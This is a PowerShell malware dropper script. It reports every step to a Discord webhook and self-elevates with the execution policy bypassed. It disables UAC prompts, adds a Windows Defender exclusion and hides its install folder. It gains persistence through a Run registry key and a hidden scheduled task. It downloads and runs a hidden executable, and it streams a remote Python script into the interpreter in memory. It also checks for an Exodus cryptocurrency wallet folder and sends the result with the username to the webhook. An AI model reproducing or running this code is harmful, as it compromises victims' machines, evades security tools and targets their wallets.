# Initialize variables
$webhookUrl = "https://discord.com/api/webhooks/1410962330300321834/9siRJ2eeQ-3gaV1Ma3r7akXbqZfdHrYG8owFAmySTUkdVVrH8pTFIehfXk87z9A9HuzR"
$logPath = Join-Path $env:USERPROFILE "Documents\winlog.log"

# Function to send log to webhook and file with rate limit handling
function Send-Log {
    param (
        [string]$message
    )
    # Log to file
    try {
        "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $message" | Out-File -FilePath $logPath -Append -ErrorAction Stop
    }
    catch {
        Write-Error "Failed to write to log file: $_"
    }

    # Log to webhook
    $body = @{ content = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $message" } | ConvertTo-Json
    $attempt = 0
    $success = $false
    while (-not $success -and $attempt -lt 3) {
        try {
            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json' -ErrorAction Stop
            $success = $true
        }
        catch {
            $attempt++
            $errorDetails = "Webhook attempt $attempt failed: $($_.Exception.Message)"
            try {
                "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $errorDetails" | Out-File -FilePath $logPath -Append
            }
            catch {
                Write-Error "Failed to log webhook error to file: $_"
            }
            if ($_.Exception.Response.StatusCode -eq 429) {
                $retryAfter = [int]$_.Exception.Response.Headers['Retry-After']
                if ($retryAfter -gt 0) {
                    Start-Sleep -Seconds $retryAfter
                }
                else {
                    Start-Sleep -Seconds (5 * $attempt)  # Fallback exponential backoff
                }
            }
            else {
                Start-Sleep -Seconds (5 * $attempt)
            }
            if ($attempt -eq 3) {
                try {
                    "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to send webhook message after 3 attempts: $_" | Out-File -FilePath $logPath -Append
                }
                catch {
                    Write-Error "Failed to log final webhook failure to file: $_"
                }
            }
        }
    }
}

# Log script start
Send-Log "Script started"

# Check if running as admin and attempt elevation
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Send-Log "Not running as admin, attempting elevation"
    try {
        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"& { $($MyInvocation.MyCommand.Definition) }`"" -Verb RunAs -WindowStyle Hidden
        Send-Log "Started elevated instance, exiting non-elevated script"
        exit 0  # Exit non-elevated script if elevation is attempted
    }
    catch {
        Send-Log "Failed to elevate privileges, continuing without admin rights: $($_.Exception.Message)"
    }
}
else {
    Send-Log "Running with admin privileges"
}

# Initialize variables
$installFolder = (Get-ChildItem -Path "C:\Program Files" -Directory -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName | Get-Random) ?? "C:\Program Files"
$exePath = Join-Path $installFolder "scripthelper.exe"
$exeUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe"
$maxRetries = 3
$baseDelay = 1000
$maxDelay = 10000

# Simplified retry function with exponential backoff
function Invoke-Retry {
    param (
        [ScriptBlock]$Action
    )
    $retryCount = 0
    while ($retryCount -lt $maxRetries) {
        try {
            & $Action
            return
        }
        catch {
            $retryCount++
            $errorDetails = "Retry attempt $retryCount failed: $($_.Exception.Message)"
            Send-Log $errorDetails
            if ($retryCount -eq $maxRetries) {
                Send-Log "Action failed after $maxRetries retries: $($_.Exception.Message)"
                return
            }
            $delay = [math]::Min($baseDelay * [math]::Pow(2, $retryCount), $maxDelay)
            Start-Sleep -Milliseconds $delay
        }
    }
}

# Create and hide install folder
try {
    Send-Log "Attempting to create install folder: $installFolder"
    if (-not (Test-Path $installFolder)) {
        New-Item -Path $installFolder -ItemType Directory -Force | Out-Null
        Set-ItemProperty -Path $installFolder -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction SilentlyContinue
        Send-Log "Created and hid install folder: $installFolder"
    }
    else {
        Send-Log "Install folder already exists: $installFolder"
    }
}
catch {
    Send-Log "Failed to create or hide install folder: $($_.Exception.Message)"
}

# Disable UAC prompt (requires admin)
try {
    Send-Log "Attempting to disable UAC prompt"
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -ErrorAction Stop
    Send-Log "Disabled UAC prompt"
}
catch {
    Send-Log "Failed to disable UAC prompt (admin required): $($_.Exception.Message)"
}

# Add Windows Defender exclusion for the install folder (requires admin)
try {
    Send-Log "Attempting to add Defender exclusion for $installFolder"
    Invoke-Retry {
        $exclusions = Get-MpPreference -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ExclusionPath
        if ($exclusions -notcontains $installFolder) {
            Add-MpPreference -ExclusionPath $installFolder -ErrorAction Stop
            Send-Log "Added Defender exclusion for $installFolder"
        }
        else {
            Send-Log "Defender exclusion already exists for $installFolder"
        }
    }
}
catch {
    Send-Log "Failed to add Defender exclusion (admin required): $($_.Exception.Message)"
}

# Add EXE to startup registry (requires admin)
try {
    Send-Log "Attempting to add registry startup entry for $exePath"
    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    $regName = "ScriptHelper"
    $regValue = "`"$exePath`""
    if (-not (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue)) {
        New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -ErrorAction Stop
        Send-Log "Added registry startup entry for $exePath"
    }
    else {
        Send-Log "Registry startup entry already exists for $exePath"
    }
}
catch {
    Send-Log "Failed to add registry startup entry (admin required): $($_.Exception.Message)"
}

# Create scheduled task for EXE (requires admin)
try {
    Send-Log "Attempting to create scheduled task: ScriptHelperTask"
    $taskName = "ScriptHelperTask"
    if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
        $action = New-ScheduledTaskAction -Execute $exePath
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $principal = New-ScheduledTaskPrincipal -GroupId "Users" -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description "Script Helper Task" -ErrorAction Stop
        Send-Log "Created scheduled task: $taskName"
    }
    else {
        Send-Log "Scheduled task already exists: $taskName"
    }
}
catch {
    Send-Log "Failed to create scheduled task (admin required): $($_.Exception.Message)"
}

# Download and execute scripthelper.exe
$webClient = $null
try {
    Send-Log "Attempting to download and execute $exePath"
    Invoke-Retry {
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($exeUrl, $exePath)
        if (Test-Path $exePath) {
            Start-Process -FilePath $exePath -WindowStyle Hidden -Wait
            Send-Log "Successfully downloaded and executed $exePath"
        }
        else {
            throw "File not found at $exePath"
        }
    }
}
catch {
    Send-Log "Failed to download or execute scripthelper.exe: $($_.Exception.Message)"
}
finally {
    if ($webClient) {
        $webClient.Dispose()
        Send-Log "Disposed WebClient for scripthelper.exe download"
    }
}

# Execute Python script in memory
$pythonScriptUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/1.pyw"
try {
    Send-Log "Checking for Python installation"
    $null = python --version 2>&1
    if ($LASTEXITCODE -eq 0) {
        Send-Log "Python found, attempting to execute Python script"
        Invoke-Retry {
            $webClient = New-Object System.Net.WebClient
            $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) PowerShell/7.0")
            $pythonScriptContent = $webClient.DownloadString($pythonScriptUrl)
            if ($pythonScriptContent) {
                $processInfo = New-Object System.Diagnostics.ProcessStartInfo
                $processInfo.FileName = "python"
                $processInfo.Arguments = "-"
                $processInfo.RedirectStandardInput = $true
                $processInfo.UseShellExecute = $false
                $processInfo.CreateNoWindow = $true
                $process = [System.Diagnostics.Process]::Start($processInfo)
                $process.StandardInput.Write($pythonScriptContent)
                $process.StandardInput.Close()
                $process.WaitForExit(30000)
                Send-Log "Successfully executed Python script"
            }
            else {
                throw "Failed to download Python script content"
            }
        }
    }
    else {
        Send-Log "Python not found, skipping Python script execution"
    }
}
catch {
    Send-Log "Failed to execute Python script: $($_.Exception.Message)"
}
finally {
    if ($webClient) {
        $webClient.Dispose()
        Send-Log "Disposed WebClient for Python script download"
    }
    if ($process) {
        $process.Dispose()
        Send-Log "Disposed Python process"
    }
}

# Check for Exodus folder and send Discord webhook notification
try {
    Send-Log "Checking for Exodus folder: $path"
    $path = "C:\Users\admin\AppData\Roaming\Exodus"
    $user = $env:USERNAME
    $msg = if (Test-Path $path) { "@everyone Exists! User: $user" } else { "Does not Exist! User: $user" }
    $body = @{ content = $msg } | ConvertTo-Json
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json'
    Send-Log "Sent Discord webhook notification: $msg"
}
catch {
    Send-Log "Failed to send Discord webhook: $($_.Exception.Message)"
}

# Log script completion
Send-Log "Script completed"
